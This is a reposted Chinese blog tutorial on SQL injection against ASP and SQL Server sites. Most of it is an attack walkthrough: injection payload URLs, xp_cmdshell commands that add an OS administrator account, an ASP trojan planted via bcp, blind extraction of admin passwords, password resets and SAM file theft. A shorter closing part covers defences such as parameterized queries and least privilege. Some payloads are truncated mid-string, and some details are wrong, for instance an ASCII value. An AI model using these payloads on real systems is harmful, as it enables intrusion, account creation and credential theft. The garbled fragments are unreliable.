
# SQL注入攻击 - forever1dreamsxx--NLP - CSDN博客


2013年05月02日 09:34:23[forever1dreamsxx](https://me.csdn.net/forever1dreamsxx)阅读数：571个人分类：[黑客攻击																](https://blog.csdn.net/forever1dreamsxx/article/category/1381491)[数据库																](https://blog.csdn.net/forever1dreamsxx/article/category/1241044)[
							](https://blog.csdn.net/forever1dreamsxx/article/category/1381491)



转载地址：[http://www.cnblogs.com/tanshuicai/archive/2010/02/03/1664900.html](http://www.cnblogs.com/tanshuicai/archive/2010/02/03/1664900.html)
SQL注入攻击是[黑客](http://baike.baidu.com/view/1960.htm)对[数据库](http://baike.baidu.com/view/1088.htm)进行攻击的常用手段之一。随着[B/S](http://baike.baidu.com/view/8039.htm)模式应用开发的发展，使用这种模式编写应用程序的[程序员](http://baike.baidu.com/view/39175.htm)也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写[代码](http://baike.baidu.com/view/41.htm)的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL
 Injection，即SQL注入。SQL注入是从正常的WWW端口访问，而且表面看起来跟一般的Web页面访问没什么区别，所以目前市面的[防火墙](http://baike.baidu.com/view/3067.htm)都不会对SQL注入发出警报，如果管理员没查看[IIS](http://baike.baidu.com/view/850.htm)日志的习惯，可能被入侵很长时间都不会发觉。但是，SQL注入的手法相当灵活，在注入的时候会碰到很多意外的情况，需要构造巧妙的SQL语句，从而成功获取想要的数据。
**SQL注入攻击的总体思路**
·发现SQL注入位置；
·判断后台数据库类型；
·确定XP_CMDSHELL可执行情况
·发现WEB虚拟目录
·上传[ASP木马](http://baike.baidu.com/view/364325.htm)；
·得到管理员权限；
**SQL注入攻击的步骤**
一、SQL注入漏洞的判断
一般来说，SQL注入一般存在于形如：HTTP://xxx.xxx.xxx/abc.asp?id=XX等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过滤，存在SQL注入的可能性就非常大。
为了全面了解动态网页回答的信息，首选请调整IE的配置。把IE菜单-工具-Internet选项－高级－显示友好HTTP错误信息前面的勾去掉。
为了把问题说明清楚，以下以HTTP://xxx.xxx.xxx/abc.asp?p=YY为例进行分析，YY可能是整型，也有可能是字符串。
1、整型参数的判断
当输入的参数YY为整型时，通常abc.asp中SQL语句原貌大致如下：
select * from 表名 where 字段=YY，所以可以用以下步骤测试SQL注入是否存在。
①HTTP://xxx.xxx.xxx/abc.asp?p=YY’(附加一个单引号)，此时abc.ASP中的SQL语句变成了
select * from 表名 where 字段=YY’，abc.asp运行异常；
②HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=1, abc.asp运行正常，而且与HTTP://xxx.xxx.xxx/abc.asp?p=YY运行结果相同；
③HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=2, abc.asp运行异常；
如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。
2、字符串型参数的判断
当输入的参数YY为字符串时，通常abc.asp中SQL语句原貌大致如下：
select * from 表名 where 字段='YY'，所以可以用以下步骤测试SQL注入是否存在。
①HTTP://xxx.xxx.xxx/abc.asp?p=YY’(附加一个单引号)，此时abc.ASP中的SQL语句变成了
select * from 表名 where 字段=YY’，abc.asp运行异常；
②HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... 39;1'='1', abc.asp运行正常，而且与HTTP://xxx.xxx.xxx/abc.asp?p=YY运行结果相同；
③HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... 39;1'='2', abc.asp运行异常；
如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。
3、特殊情况的处理
有时ASP程序员会在程序员过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种方法试一试。
①大小定混合法：由于VBS并不区分大小写，而程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；
②UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息参见附件一；
③ASCII码法：可以把输入的部分或全部字符全部用ASCII码代替，如U=chr(85),a=chr(97)等，ASCII信息参见附件二；
二、分析数据库服务器类型
一般来说，ACCESS与SQL－SERVER是最常用的数据库服务器，尽管它们都支持T－SQL标准，但还有不同之处，而且不同的数据库有不同的攻击方法，必须要区别对待。
1、 利用数据库服务器的系统变量进行区分
SQL－SERVER有user,db_name()等系统变量，利用这些系统值不仅可以判断SQL-SERVER，而且还可以得到大量有用信息。如：
① HTTP://xxx.xxx.xxx/abc.asp?p=YY and user>0 不仅可以判断是否是SQL-SERVER，而还可以得到当前连接到数据库的用户名
②HTTP://xxx.xxx.xxx/abc.asp?p=YY&n ... db_name()>0 不仅可以判断是否是SQL-SERVER，而还可以得到当前正在使用的数据库名；
2、利用系统表
ACCESS的系统表是msysobjects,且在WEB环境下没有访问权限，而SQL-SERVER的系统表是sysobjects,在WEB环境下有访问权限。对于以下两条语句：
①HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from sysobjects)>0
②HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from msysobjects)>0
若数据库是SQL-SERVE，则第一条，abc.asp一定运行正常，第二条则异常；若是ACCESS则两条都会异常。
3、 MSSQL三个关键系统表
sysdatabases系统表：Microsoft SQL Server 上的每个数据库在表中占一行。最初安装 SQL Server 时，sysdatabases 包含 master、model、msdb、mssqlweb 和 tempdb 数据库的项。该表只存储在 master 数据库中。 这个表保存在master数据库中，这个表中保存的是什么信息呢？这个非常重要。他是 保存了所有的库名,以及库的ID和一些相关信息。
这里我把对于我们有用的字段名称和相关说明给大家列出来。name //表示库的名字。
dbid //表示库的ID，dbid从1到5是系统的。分别是：master、model、msdb、mssqlweb、tempdb 这五个库。用select * from master.dbo.sysdatabases 就可以查询出所有的库名。
Sysobjects：SQL-SERVER的每个数据库内都有此系统表，它存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，每个对象在表中占一行。
syscolumns：每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。该表位于每个数据库中。主要字段有：
name ，id， colid ：分别是字段名称，表ID号，字段ID号，其中的 ID 是 刚上我们用sysobjects得到的表的ID号。
用: select * from ChouYFD.dbo.syscolumns where id=123456789 得到ChouYFD这个库中，表的ID是123456789中的所有字段列表。
三、确定XP_CMDSHELL可执行情况
若当前连接数据的帐号具有SA权限，且master.dbo.xp_cmdshell扩展存储过程(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可以通过以下几种方法完全控制，以后的所有步骤都可以省
1、HTTP://xxx.xxx.xxx/abc.asp?p=YY&nb ... er>0 abc.asp执行异常但可以得到当前连接数据库的用户名(若显示dbo则代表SA)。
2、HTTP://xxx.xxx.xxx/abc.asp?p=YY ... me()>0 abc.asp执行异常但可以得到当前连接的数据库名。
3、HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net user aaa bbb /add”-- (master是SQL-SERVER的主数据库；名中的分号表示SQL-SERVER执行完分号前的语句名，继续执行其后面的语句；“—”号是注解，表示其后面的所有内容仅为注释，系统并不执行)可以直接增加操作系统帐户aaa,密码为bbb。
4、HTTP://xxx.xxx.xxx/abc.asp?p=YY；exec master..xp_cmdshell “net localgroup administrators aaa /add”-- 把刚刚增加的帐户aaa加到administrators组中。
5、HTTP://xxx.xxx.xxx/abc.asp?p=YY；backuup database 数据库名 to disk='c:\inetpub\wwwroot\save.db' 则把得到的数据内容全部备份到WEB目录下，再用HTTP把此文件下载(当然首选要知道WEB虚拟目录)。
6、通过复制CMD创建UNICODE漏洞
HTTP://xxx.xxx.xxx/abc.asp?p=YY;exe ... dbo.xp_cmdshell “copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe” 便制造了一个UNICODE漏洞，通过此漏洞的利用方法，便完成了对整个计算机的控制(当然首选要知道WEB虚拟目录)。
四、发现WEB虚拟目录
只有找到WEB虚拟目录，才能确定放置ASP木马的位置，进而得到USER权限。有两种方法比较有效。
一是根据经验猜解，一般来说，WEB虚拟目录是：c:\inetpub\wwwroot; D:\inetpub\wwwroot; E:\inetpub\wwwroot等，而可执行虚拟目录是：c:\inetpub\scripts; D:\inetpub\scripts; E:\inetpub\scripts等。
二是遍历系统的目录结构，分析结果并发现WEB虚拟目录；
先创建一个临时表：temp
HTTP://xxx.xxx.xxx/abc.asp?p=YY;create&n ... mp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
接下来：
（1）利用xp_availablemedia来获得当前所有驱动器,并存入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert temp ... ter.dbo.xp_availablemedia;--
我们可以通过查询temp的内容来获得驱动器列表及相关信息
（2）利用xp_subdirs获得子目录列表,并存入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert into temp(i ... dbo.xp_subdirs 'c:\';--
（3）利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';--
注意：
1、以上每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：
HTTP://xxx.xxx.xxx/abc.asp?p=YY;delete from temp;--
2、浏览TEMP表的方法是：(假设TestDB是当前连接的数据库名)
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top& ... nbsp;TestDB.dbo.temp )>0 得到表TEMP中第一条记录id字段的值，并与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现id字段的值。假设发现的表名是xyz，则
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 id from ... ere id not in('xyz'))>0 得到表TEMP中第二条记录id字段的值。
五、上传ASP木马
所谓ASP木马，就是一段有特殊功能的ASP代码，并放入WEB虚拟目录的Scripts下，远程客户通过[IE](http://baike.baidu.com/view/703.htm)就可执行它，进而得到系统的USER权限，实现对系统的初步控制。上传ASP木马一般有两种比较有效的方法：
1、利用WEB的远程管理功能
许多WEB站点，为了维护的方便，都提供了远程管理的功能；也有不少WEB站点，其内容是对于不同的用户有不同的访问权限。为了达到对用户权限的控制，都有一个网页，要求用户名与密码，只有输入了正确的值，才能进行下一步的操作,可以实现对WEB的管理，如上传、下载文件，目录浏览、修改配置等。
因此，若获取正确的用户名与密码，不仅可以上传ASP木马，有时甚至能够直接得到USER权限而浏览系统，上一步的“发现WEB虚拟目录”的复杂操作都可省略。
用户名及密码一般存放在一张表中，发现这张表并读取其中内容便解决了问题。以下给出两种有效方法。
A、 注入法：
从理论上说，认证网页中会有型如：
select * from admin where username='XXX' and password='YYY' 的语句，若在正式运行此句之前，没有进行必要的字符过滤，则很容易实施SQL注入。
如在用户名文本框内输入：abc’ or 1=1-- 在密码框内输入：123 则SQL语句变成：
select * from admin where username='abc’ or 1=1 and password='123’ 不管用户输入任何用户名与密码，此语句永远都能正确执行，用户轻易骗过系统，获取合法身份。
B、猜解法：
基本思路是：猜解所有数据库名称，猜出库中的每张表名，分析可能是存放用户名与密码的表名，猜出表中的每个字段名，猜出表中的每条记录内容。
猜解所有数据库名称
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0 因为 dbid 的值从1到5，是系统用了。所以用户自己建的一定是从6开始的。并且我们提交了 name>1 (name字段是一个字符型的字段和数字比较会出错),abc.asp工作异常，可得到第一个数据库名，同理把DBID分别改成7,8，9,10,11,12…就可得到所有数据库名。
以下假设得到的数据库名是TestDB。
猜解数据库中用户名表的名称
猜解法：此方法就是根据个人的经验猜表名，一般来说，user,users,member,members,userlist,memberlist,userinfo,manager,admin,adminuser,systemuser,systemusers,sysuser,sysusers,sysaccounts,systemaccounts等。并通过语句进行判断
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(*) from TestDB.dbo.表名)>0 若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。
读取法：SQL-SERVER有一个存放系统核心信息的表sysobjects，有关一个库的所有表，视图等信息全部存放在此表中，而且此表可以通过WEB进行访问。
当xtype='U' and status>0代表是用户建立的表，发现并分析每一个用户建立的表及名称，便可以得到用户名表的名称，基本的实现方法是：
①HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 name from TestD ... type='U' and status>0 )>0 得到第一个用户建立表的名称，并与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现表的名称。假设发现的表名是xyz，则
②HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 name from TestDB.dbo.sysobjects& ... tatus>0 and name not in('xyz'))>0 可以得到第二个用户建立的表的名称，同理就可得到所有用建立的表的名称。
根据表的名称，一般可以认定那张表用户存放用户名及密码，以下假设此表名为Admin。
l 猜解用户名字段及密码字段名称
admin表中一定有一个用户名字段，也一定有一个密码字段，只有得到此两个字段的名称，才有可能得到此两字段的内容。如何得到它们的名称呢，同样有以下两种方法。
猜解法：此方法就是根据个人的经验猜字段名，一般来说，用户名字段的名称常用：username,name,user,account等。而密码字段的名称常用：password,pass,pwd,passwd等。并通过语句进行判断
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select count(字段名) from TestDB.dbo.admin)>0 “select count(字段名) from 表名”语句得到表的行数，所以若字段名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到两个字段的名称。
读取法：基本的实现方法是
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select ... me(object_id('admin'),1) from TestDB.dbo.sysobjects)>0 。select top 1 col_name(object_id('admin'),1) from TestDB.dbo.sysobjects是从sysobjects得到已知表名的第一个字段名，当与整数进行比较，显然abc.asp工作异常，但在异常中却可以发现字段的名称。把col_name(object_id('admin'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
l 猜解用户名与密码
猜用户名与密码的内容最常用也是最有效的方法有：
ASCII码逐字解码法:虽然这种方法速度较慢，但肯定是可行的。基本的思路是先猜出字段的长度，然后依次猜出每一位的值。猜用户名与猜密码的方法相同，以下以猜用户名为例说明其过程。
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top&n ... nbsp;from TestDB.dbo.admin)=X(X=1,2，3,4，5，… n，username为用户名字段的名称，admin为表的名称)，若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。如：当输入
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top ... e) from TestDB.dbo.admin)=8时abc.asp运行正常，则第一个用户名的长度为8
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,m,1)) from TestDB.dbo.admin)=n (m的值在1到上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，若n为某一值i且abc.asp运行正常时，则i对应ASCII码就是用户名某一位值。如：当输入
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,3,1)) from TestDB.dbo.admin)=80时abc.asp运行正常，则用户名的第三位为P(P的ASCII为80)；
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (sel ... ascii(substring(username,9,1)) from TestDB.dbo.admin)=33时abc.asp运行正常，则用户名的第9位为!(!的ASCII为80)；
猜到第一个用户名及密码后，同理，可以猜出其他所有用户名与密码。注意：有时得到的密码可能是经MD5等方式加密后的信息，还需要用专用工具进行脱密。或者先改其密码，使用完后再改回来，见下面说明。
简单法：猜用户名用
HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1 ... o.admin where username>1) , flag是admin表中的一个字段，username是用户名字段，此时abc.asp工作异常，但能得到Username的值。与上同样的方法，可以得到第二用户名，第三个用户等等，直到表中的所有用户名。
猜用户密码：HTTP://xxx.xxx.xxx/abc.asp?p=YY and (select top 1&nb ... B.dbo.admin where pwd>1) , flag是admin表中的一个字段，pwd是密码字段，此时abc.asp工作异常，但能得到pwd的值。与上同样的方法，可以得到第二用户名的密码，第三个用户的密码等等，直到表中的所有用户的密码。密码有时是经MD5加密的，可以改密码。
HTTP://xxx.xxx.xxx/abc.asp?p=YY;update TestDB.dbo.admin set pwd=' ... where username='www';-- ( 1的MD5值为：AAABBBCCCDDDEEEF，即把密码改成1；www为已知的用户名)
用同样的方法当然可把密码改原来的值。
2、利用表内容导成文件功能
SQL有BCP命令，它可以把表的内容导成文本文件并放到指定位置。利用这项功能，我们可以先建一张临时表，然后在表中一行一行地输入一个ASP木马，然后用BCP命令导出形成ASP文件。
命令行格式如下：
bcp "select * from text..foo" queryout c:\inetpub\wwwroot\runcommand.asp –c –S localhost –U sa –P foobar ('S'参数为执行查询的服务器，'U'参数为用户名，'P'参数为密码，最终上传了一个runcommand.asp的木马)
六、得到系统的管理员权限
ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？提升权限的方法有很多种：
上传木马，修改开机自动运行的.ini文件(它一重启，便死定了)；
复制CMD.exe到scripts，人为制造UNICODE漏洞；
下载SAM文件，破解并获取OS的所有用户名密码；
等等，视系统的具体情况而定，可以采取不同的方法。
七、几个SQL-SERVER专用手段
1、利用xp_regread扩展存储过程修改注册表
[xp_regread]另一个有用的内置存储过程是xp_regXXXX类的函数集合(Xp_regaddmultistring，Xp_regdeletekey，Xp_regdeletevalue，Xp_regenumkeys，Xp_regenumvalues，Xp_regread，Xp_regremovemultistring，Xp_regwrite)。攻击者可以利用这些函数修改注册表，如读取SAM值，允许建立空连接，开机自动运行程序等。如：
exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' 确定什么样的会话连接在服务器可用。
exec xp_regenumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities' 显示服务器上所有SNMP团体配置，有了这些信息，攻击者或许会重新配置同一网络中的网络设备。
2、利用其他存储过程去改变服务器
xp_servicecontrol过程允许用户启动，停止服务。如：
(exec master..xp_servicecontrol 'start','schedule'
exec master..xp_servicecontrol 'start','server')
Xp_availablemedia 显示机器上有用的驱动器
Xp_dirtree 允许获得一个目录树
Xp_enumdsn 列举服务器上的ODBC数据源
Xp_loginconfig 获取服务器安全信息
Xp_makecab 允许用户在服务器上创建一个压缩文件
Xp_ntsec_enumdomains 列举服务器可以进入的域
Xp_terminate_process 提供进程的进程ID，终止此进程
**SQL注入攻击的背景**
在计算机技术高速发展的今天，越来越让人们头疼的是面临越来越“变态”和复杂的威胁网站技术，他们利用Internet 执行各种恶意活动，如身份窃取、私密信息窃取、带宽资源占用等。它们潜入之后，还会扩散并不断更新自己。这些活动常常利用用户的好奇心，在用户不知道或未来允许的情况下潜入用户的PC，不知不觉中，帐户里的资金就被转移了，公司讯息也被传送出去，危害十分严重。2006年8月16日，第一个Web威胁样本出现，截止到2006年10月25日，已经产生了第150个变种，并且，还在不断地演化下去。
网站威胁的目标定位有多个维度，是个人还是公司，还是某种行业，都有其考虑，甚至国家、地区、性别、种族、宗教等也成为发动攻击的原因或动机。攻击还会采用多种形态，甚至是复合形态，比如病毒、蠕虫、特洛伊、间谍软件、僵尸、网络钓鱼电子邮件、漏洞利用、下载程序、社会工程、rootkit、黑客，结果都可以导致用户信息受到危害，或者导致用户所需的服务被拒绝和劫持。从其来源说Web威胁还可以分为内部攻击和外部攻击两类。前者主要来自信任网络，可能是用户执行了未授权访问或是无意中定制了恶意攻击；后者主要是由于网络漏洞被利用或者用户受到恶意程序制定者的专一攻击。
**SQL注入攻击的网络分析**
SQL注入攻击是非常令人讨厌的安全漏洞，是所有的web开发人员，不管是什么平台，技术，还是数据层，需要确信他们理解和防止的东西。不幸的是，开发人员往往不集中花点时间在这上面，以至他们的应用，更糟糕的是，他们的客户极其容易受到攻击。
Michael Sutton 最近发表了一篇非常发人深省的帖子，讲述在公共网上这问题是多么地普遍。他用Google的Search API建了一个C\#的客户端程序，寻找那些易受SQL 注入攻击的网站。其步骤很简单：
1，寻找那些带查询字符串的网站(例如，查询那些在URL里带有 "id=" 的URL)
2，给这些确定为动态的网站发送一个请求，改变其中的id=语句，带一个额外的单引号，来试图取消其中的SQL语句(例如，如 id=6' )
3，分析返回的回复，在其中查找象“SQL” 和“query”这样的词，这往往表示应用返回了详细的错误消息(这本身也是很糟糕的)
4，检查错误消息是否表示发送到SQL服务器的参数没有被正确加码(encoded)，如果如此，那么表示可对该网站进行SQL注入攻击
对通过Google搜寻找到的1000个网站的随机取样测试，他检测到其中的11.3%有易受SQL注入攻击的可能。这非常，非常地可怕。这意味着黑客可以远程利用那些应用里的数据，获取任何没有hashed或加密的密码或信用卡数据，甚至有以管理员身份登陆进这些应用的可能。这不仅对开发网站的开发人员来说很糟糕，而且对使用网站的消费者或用户来说更糟糕，因为他们给网站提供了数据，想着网站是安全的呢。
那么SQL注入攻击到底是什么玩意？
有几种情形使得SQL注入攻击成为可能。最常见的原因是，你动态地构造了SQL语句，却没有使用正确地加了码(encoded)的参数。譬如，考虑这个SQL查询的编码，其目的是根据由查询字符串提供的社会保险号码(social security number)来查询作者(Authors)：
Dim SSN as String
Dim SqlQuery as String
SSN = Request.QueryString("SSN")
SqlQuery = "SELECT au_lname, au_fname FROM authors WHERE au_id = '" + SSN + "'"
如果你有象上面这个片断一样的SQL编码，那么你的整个数据库和应用可以远程地被黑掉。怎么会呢？在普通情形下，用户会使用一个社会保险号码来访问这个网站，编码是象这样执行的：
' URL to the page containing the above code
http://mysite.com/listauthordetails.aspx?SSN=172-32-9999
' SQL Query executed against the database
SELECT au_lname, au_fname FROM authors WHERE au_id = '172-32-9999'
这是开发人员预期的做法，通过社会保险号码来查询数据库中作者的信息。但因为参数值没有被正确地加码，黑客可以很容易地修改查询字符串的值，在要执行的值后面嵌入附加的SQL语句 。譬如，
' URL to the page containing the above code
http://mysite.com/listauthordetails.aspx?SSN=172-32-9999';DROP DATABASE pubs --
' SQL Query executed against the database
SELECT au_lname, au_fname FROM authors WHERE au_id = '';DROP DATABASE pubs --
注意到没有，可以在SSN查询字符串值的后面添加“ ';DROP DATABASE pubs -- ”，通过 “;”字符来终止当前的SQL语句，然后添加了自己的恶意的SQL语句，然后把语句的其他部分用“--”字符串注释掉。因为是手工在编码里构造SQL语句，最后把这个字符串传给了数据库，数据库会先对authors表进行查询，然后把我们的pubs数据库删除。“砰(bang)”的一声，数据库就没了！
万一你认为匿名黑客删除你的数据库的结果很坏，但不幸的是，实际上，这在SQL注入攻击所涉及的情形中算是比较好的。一个黑客可以不单纯摧毁数据，而是使用上面这个编码的弱点，执行一个JOIN语句，来获取你数据库里的所有数据，显示在页面上，允许他们获取用户名，密码，信用卡号码等等。他们也可以添加 UPDATE/INSERT 语句改变产品的价格，添加新的管理员账号，真的搞砸你(screw up your life)呢。想象一下，到月底检查库存时，发现你库房里的实际产品数与你的账目系统(accounting system)汇报的数目有所不同。
**如何防范SQL注入攻击**
SQL注入攻击是你需要担心的事情，不管你用什么web编程技术，再说所有的web框架都需要担心这个的。你需要遵循几条非常基本的规则：
1)在构造动态SQL语句时，一定要使用类安全(type-safe)的参数加码机制。大多数的数据API，包括ADO和ADO.NET，有这样的支持，允许你指定所提供的参数的确切类型(譬如，字符串，整数，日期等)，可以保证这些参数被恰当地escaped/encoded了，来避免黑客利用它们。一定要从始到终地使用这些特性。
例如，在ADO.NET里对动态SQL，你可以象下面这样重写上述的语句，使之安全：
Dim SSN as String = Request.QueryString("SSN")
Dim cmd As new SqlCommand("SELECT au_lname, au_fname FROM authors WHERE au_id = @au_id")
Dim param = new SqlParameter("au_id", SqlDbType.VarChar)
param.Value = SSN
cmd.Parameters.Add(param)
这将防止有人试图偷偷注入另外的SQL表达式(因为ADO.NET知道对au_id的字符串值进行加码)，以及避免其他数据问题(譬如不正确地转换数值类型等)。注意，VS 2005内置的TableAdapter/DataSet设计器自动使用这个机制，ASP.NET 2.0数据源控件也是如此。
一个常见的错误知觉(misperception)是，假如你使用了存储过程或ORM，你就完全不受SQL注入攻击之害了。这是不正确的，你还是需要确定在给存储过程传递数据时你很谨慎，或在用ORM来定制一个查询时，你的做法是安全的。
2) 在部署你的应用前，始终要做安全审评(security review)。建立一个正式的安全过程(formal security process)，在每次你做更新时，对所有的编码做审评。后面一点特别重要。很多次我听说开发队伍在正式上线(going live)前会做很详细的安全审评，然后在几周或几个月之后他们做一些很小的更新时，他们会跳过安全审评这关，推说，“就是一个小小的更新，我们以后再做编码审评好了”。请始终坚持做安全审评。
3) 千万别把敏感性数据在数据库里以明文存放。我个人的意见是，密码应该总是在单向(one-way )hashed过后再存放，我甚至不喜欢将它们在加密后存放。在默认设置下，ASP.NET 2.0 Membership API 自动为你这么做，还同时实现了安全的SALT 随机化行为(SALT randomization behavior)。如果你决定建立自己的成员数据库，我建议你查看一下我们在这里发表的我们自己的Membership provider的源码。同时也确定对你的数据库里的信用卡和其他的私有数据进行了加密。这样即使你的数据库被人入侵(compromised)了的话，起码你的客户的私有数据不会被人利用。
4)确认你编写了自动化的单元测试，来特别校验你的数据访问层和应用程序不受SQL注入攻击。这么做是非常重要的，有助于捕捉住(catch)“就是一个小小的更新，所有不会有安全问题”的情形带来的疏忽，来提供额外的安全层以避免偶然地引进坏的安全缺陷到你的应用里去。
5)锁定你的数据库的安全，只给访问数据库的web应用功能所需的最低的权限。如果web应用不需要访问某些表，那么确认它没有访问这些表的权限。如果web应用只需要只读的权限从你的account payables表来生成报表，那么确认你禁止它对此表的 insert/update/delete 的权限。
6)很多新手从网上下载SQL通用防注入系统的程序，在需要防范注入的页面头部用 来防止别人进行手动注入测试（。
可是如果通过SQL注入分析器就可轻松跳过防注入系统并自动分析其注入点。然后只需要几分钟，你的管理员账号及密码就会被分析出来。
7)对于注入分析器的防范，笔者通过实验，发现了一种简单有效的防范方法。首先我们要知道SQL注入分析器是如何工作的。在操作过程中，发现软件并不是冲着“admin”管理员账号去的，而是冲着权限（如flag=1）去的。这样一来，无论你的管理员账号怎么变都无法逃过检测。
第三步：既然无法逃过检测，那我们就做两个账号，一个是普通的管理员账号，一个是防止注入的账号，为什么这么说呢？笔者想，如果找一个权限最大的账号制造假象，吸引软件的检测，而这个账号里的内容是大于千字以上的中文字符，就会迫使软件对这个账号进行分析的时候进入全负荷状态甚至资源耗尽而死机。下面我们就来修改数据库吧。
1.对表结构进行修改。将管理员的账号字段的数据类型进行修改，文本型改成最大字段255（其实也够了，如果还想做得再大点，可以选择备注型），密码的字段也进行相同设置。
2.对表进行修改。设置管理员权限的账号放在ID1，并输入大量中文字符（最好大于100个字）。
3.把真正的管理员密码放在ID2后的任何一个位置（如放在ID549上）。
由于SQL注入攻击针对的是应用开发过程中的编程不严密，因而对于绝大多数防火墙来说，这种攻击是“合法”的。问题的解决只有依赖于完善编程。专门针对SQL注入攻击的工具较少，Wpoison对于用asp，php进行的开发有一定帮助...。![](http://www.cnblogs.com/eng308/aggbug/1662908.html?type=1)

